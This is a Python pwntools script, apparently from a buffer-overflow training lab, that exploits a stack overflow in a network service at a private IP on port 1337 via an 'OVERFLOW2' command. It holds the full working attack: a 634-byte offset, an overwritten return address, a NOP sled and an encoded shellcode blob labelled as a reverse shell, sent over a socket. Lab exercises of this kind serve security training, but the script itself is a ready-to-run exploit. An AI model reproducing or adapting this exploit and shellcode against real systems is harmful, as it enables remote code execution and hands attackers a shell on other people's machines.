from pwn import *

ip = "10.10.17.141"
port = 1337
command = "OVERFLOW2 "
offset = 634
retn = "\xaf\x11\x50\x62"       # Little endian
reverse_shell = "\xfc\xbb\x1b\xa5\xae\xca\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xe7\x4d\x2c\xca\x17\x8e\x51\x42\xf2\xbf\x51\x30\x77\xef\x61\x32\xd5\x1c\x09\x16\xcd\x97\x7f\xbf\xe2\x10\x35\x99\xcd\xa1\x66\xd9\x4c\x22\x75\x0e\xae\x1b\xb6\x43\xaf\x5c\xab\xae\xfd\x35\xa7\x1d\x11\x31\xfd\x9d\x9a\x09\x13\xa6\x7f\xd9\x12\x87\x2e\x51\x4d\x07\xd1\xb6\xe5\x0e\xc9\xdb\xc0\xd9\x62\x2f\xbe\xdb\xa2\x61\x3f\x77\x8b\x4d\xb2\x89\xcc\x6a\x2d\xfc\x24\x89\xd0\x07\xf3\xf3\x0e\x8d\xe7\x54\xc4\x35\xc3\x65\x09\xa3\x80\x6a\xe6\xa7\xce\x6e\xf9\x64\x65\x8a\x72\x8b\xa9\x1a\xc0\xa8\x6d\x46\x92\xd1\x34\x22\x75\xed\x26\x8d\x2a\x4b\x2d\x20\x3e\xe6\x6c\x2d\xf3\xcb\x8e\xad\x9b\x5c\xfd\x9f\x04\xf7\x69\xac\xcd\xd1\x6e\xd3\xe7\xa6\xe0\x2a\x08\xd7\x29\xe9\x5c\x87\x41\xd8\xdc\x4c\x91\xe5\x08\xc2\xc1\x49\xe3\xa3\xb1\x29\x53\x4c\xdb\xa5\x8c\x6c\xe4\x6f\xa5\x07\x1f\xf8\xc0\xde\x10\xb1\xbc\xe2\x2e\x50\x61\x6a\xc8\x38\x89\x3a\x43\xd5\x30\x67\x1f\x44\xbc\xbd\x5a\x46\x36\x32\x9b\x09\xbf\x3f\x8f\xfe\x4f\x0a\xed\xa9\x50\xa0\x99\x36\xc2\x2f\x59\x30\xff\xe7\x0e\x15\x31\xfe\xda\x8b\x68\xa8\xf8\x51\xec\x93\xb8\x8d\xcd\x1a\x41\x43\x69\x39\x51\x9d\x72\x05\x05\x71\x25\xd3\xf3\x37\x9f\x95\xad\xe1\x4c\x7c\x39\x77\xbf\xbf\x3f\x78\xea\x49\xdf\xc9\x43\x0c\xe0\xe6\x03\x98\x99\x1a\xb4\x67\x70\x9f\xd4\x85\x50\xea\x7c\x10\x31\x57\xe1\xa3\xec\x94\x1c\x20\x04\x65\xdb\x38\x6d\x60\xa7\xfe\x9e\x18\xb8\x6a\xa0\x8f\xb9\xbe\xa0\x2f\x46\x41"
padding = "\x90" * 32

payload = command + ("A" * offset) + retn + padding + reverse_shell

r = remote(host=ip, port=port, ssl=False)
print(r.recv().decode())

r.sendline(payload)
